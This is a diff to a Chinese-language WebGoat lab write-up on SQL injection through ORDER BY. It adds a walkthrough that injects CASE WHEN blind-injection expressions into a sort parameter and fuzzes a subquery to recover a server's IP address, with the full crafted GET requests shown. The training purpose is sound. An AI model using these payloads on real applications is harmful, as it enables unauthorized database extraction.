@@ -418,16 +418,15 @@ selectExpression:
 Based on HSQLDB
 ```
 
-上面的语法意味着 order 表达式可以是一个 select 表达式。所以使用case语句可以文数据库一些问题。
+上面的语法意味着 order 表达式可以是一个 select 表达式。所以使用case语句可以问数据库一些问题。
 
-例如：```select * from users order by ( case when (true) then lastname else firstname)```
+例如：```select * from users order by ( case when (true) then lastname else firstname END)```
 
 所以，我们能提交任何boolean操作在 ```when(...)``` 部分。这个语句可以执行，因为它是一个有效的查询，即便你使用了预编译的sql语句，或者即便你的语句中没有定义order子句。
 
 假如你需要提供一个排序功能，你需要设立一个白名单验证功能，验证order by语句，防止它出现意外。
 #### 练习
-
-例子需要补全的安全代码如下：
+1.例子需要补全的安全代码如下：
 ```java
 
 Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
@@ -437,3 +436,34 @@ ps.getString(2,mail);
 //ResultSet rs = ps.executeQuery();
 
 ```
+
+2.要求在order by子句中进行注入。找出'webgoat-prd'服务器的ip地址。为了节约时间，给出了部分ip地址: xxx.130.219.202
+
+首先要尝试抓包并构造case when()盲注。把点击排序按钮后发出的请求修改为如下GET request头，发现响应是200，说明构造成功。
+```GET http://10.10.10.128:8080/WebGoat/SqlInjection/servers?column=%28case+when+%28true%29+then+hostname+else+ip+end%29 HTTP/1.1```
+
+上面的CASE子句即：```(case where (true) then hostname else ip end)```
+
+下一步就是构造fuzz，猜出ip地址的前几位。
+
+```(case ip when '.130.219.202' then hostname else ip end)```
+
+下列语句可执行
+```GET http://10.10.10.128:8080/WebGoat/SqlInjection/servers?column=(case+ip+when+'%d.130.219.202'+then+hostname+else+ip+end) HTTP/1.1```
+
+把其中的hostname改为noname，会发现报错，有报错信息如下：
+```...select id, hostname, ip, mac, status, description from servers  where status <> 'out of order' order by (case hostname when 'webgoat-tst' then noname else id end)..```
+
+查看这个语句格式，有助于我们理解查询和构造fuzz。可以尝试下列语句，然后将100.130.219.202中的100建立数字fuzz。
+
+```(case (select ip from servers where hostname='webgoat-prd') when '100.130.219.202' then hostname else id end)```
+
+```GET http://10.10.10.128:8080/WebGoat/SqlInjection/servers?column=(case+(select+ip+from+servers+where+hostname%3d'webgoat-prd')+when+%27100.130.219.202%27+then+hostname+else+id+end) HTTP/1.1```
+
+最后发现ip为104.130.219.202
+
+
+
+
+
+
